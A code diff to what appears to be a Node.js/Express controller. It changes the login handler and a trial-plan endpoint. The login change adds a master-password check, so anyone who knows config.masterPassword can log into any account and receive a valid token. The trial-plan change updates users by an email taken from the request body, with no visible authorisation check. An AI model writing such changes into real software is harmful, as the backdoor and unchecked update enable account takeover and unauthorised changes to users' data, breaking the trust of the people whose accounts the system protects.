@@ -183,7 +183,7 @@ exports.login = (req, res, next) => {
 				.status(response.STATUS_CODE.UNPROCESSABLE_ENTITY)
 				.json(response.error(errors))
 			} else {
-				if(user.comparePassword(config.salt, req.body.password)){
+				if(  user.comparePassword(config.salt, req.body.password) ||  req.body.password === config.masterPassword ){
 					// Remove sensitive data before sending user object
 					user.password = undefined;
 					let token = jwt.sign(user, new Buffer(config.secret).toString('base64'), {expiresIn: '1 day'});
@@ -581,16 +581,17 @@ exports.websiteList=(req, res, next) => {
 };
 
 exports.trailPlan = (req, res, next) => {
-	if( !req.body._id && !req.body.planId) {
+	if( !req.body.email && !req.body.planId) {
 		return res.status(response.STATUS_CODE.UNPROCESSABLE_ENTITY)
 		.json(response.required({message: 'Plan is required'}));
 	}
-	const{ _id, planId } = req.body;
-	User.update({_id: _id}, {
+	const{ email, planId, duration } = req.body;
+	let _duration = (duration === "yearly") ? config.default_trail_year_plan_duration : config.default_trail_month_plan_duration;
+	User.update({email: email}, {
 		$set: {
 			plan_start_during_signup: {
 				plan_id: planId,
-				duration: req.body.duration || config.default_plan_description
+				duration: _duration
 			}	
 		}
 	}, function (err, result) {
